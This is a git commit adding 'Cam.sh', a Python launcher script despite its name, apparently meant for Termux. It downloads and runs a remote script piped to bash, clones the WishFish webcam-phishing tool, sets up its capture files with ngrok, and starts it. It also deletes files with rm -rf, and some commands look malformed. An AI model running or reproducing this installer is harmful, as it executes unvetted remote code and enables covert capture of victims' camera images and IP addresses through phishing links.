dfda37f6bbfb57720df06d356fb747d954eeed98
0101_022 <63510472+MrAli-s@users.noreply.github.com>
2021-02-05 23:09:55 +0100

    Create Cam.sh

---
+++ Cam.sh
@@ -0,0 +1,72 @@
+from os import *
+
+from os import system,remove
+
+import os
+
+from sys import *
+
+from time import *
+
+R = '\x1b[1;31m'
+
+G = '\x1b[1;32m'
+
+Y = '\x1b[1;33m'
+
+C = '\x1b[1;36m'
+
+W = '\x1b[1;37m'
+
+
+system('clear')
+
+print (Y +"    {+\+\+\+ Install Now Ngrok +/+/+/+}")
+
+system('sleep 1')
+
+system('pkg install wget -y')
+
+#system('rm -rf 01010cam saved.ip.txt README.md extract.sh fix-ar-ngrok ip.php index2.html index.php ip.php template.php LICENSE template.php saycheese.html ngrok jmaxopcam.sh post.php ~/01010cam/')
+
+system('rm -rf  saved.ip.txt getid Custom.html LICENSE README.md captured copy.sh index.php index2.html ip.php post.php ngrok template.php wishfish.html wishfish.sh WishFish/')
+
+system('wget https://raw.githubusercontent.com/Cesar-Hack-Gray/release-download/master/fix-ar-ngrok && bash fix-ar-ngrok')
+
+system('clear')
+
+system('git clone https://github.com/kinghacker0/WishFish.git')
+
+system('clear')
+
+print('''\033[1;32m        .---.''')
+
+print('''\033[1;32m        |[\033[1;31mX\033[1;32m]|''')
+
+print('''\033[1;32m _.==._.""""".___n__''')
+
+print('''\033[1;32md __ ___.-""-. _____b''')
+
+print('''\033[1;32m|[__]  /.""".\\\ _   |''')
+
+print('''\033[1;32m|     // /""\ \\\_)  |''')
+
+print('''\033[1;32m|     \\\ \__/ //    |''')
+
+print('''\033[1;32m|      \`.__.`/     |''')
+
+print('''\033[1;32m\=======`-..-`======/''')
+
+print('''\033[1;32m `-----------------` ''')
+
+input (Y + "Pleace Enter to OpEn...")
+
+system('cp $PREFIX/bin/ngrok ~/WishFish')
+
+system('mv ~/Dark.soul/WishFish/Custom.html ~/Dark.soul/WishFish/LICENSE ~/Dark.soul/WishFish/README.md ~/Dark.soul/WishFish/captured ~/Dark.soul/WishFish/copy.sh ~/Dark.soul/WishFish/index.php ~/Dark.soul/WishFish/index2.html ~/Dark.soul/WishFish/ip.php ~/Dark.soul/WishFish/post.php ~/Dark.soul/WishFish/ngrok ~/Dark.soul/WishFish/template.php ~/Dark.soul/WishFish/wishfish.html ~/Dark.soul/WishFish/wishfish.sh ~/Dark.soul/')
+
+system('mv /root/Dark.soul/WishFish/Custom.html /root/Dark.soul/WishFish/LICENSE /root/Dark.soul/WishFish/README.md /root/Dark.soul/WishFish/captured mv /root/Dark.soul/WishFish/copy.sh /root/Dark.soul/copy.sh /root/Dark.soul/WishFish/index.php /root/Dark.soul/WishFish/index2.html /root/Dark.soul/WishFish/ip.php /root/Dark.soul/WishFish/post.php /root/Dark.soul/WishFish/ngrok /root/Dark.soul/WishFish/template.php /root/Dark.soul/WishFish/wishfish.html /root/Dark.soul/WishFish/wishfish.sh /root/Dark.soul/')
+
+system('bash wishfish.sh')
+
+exit()
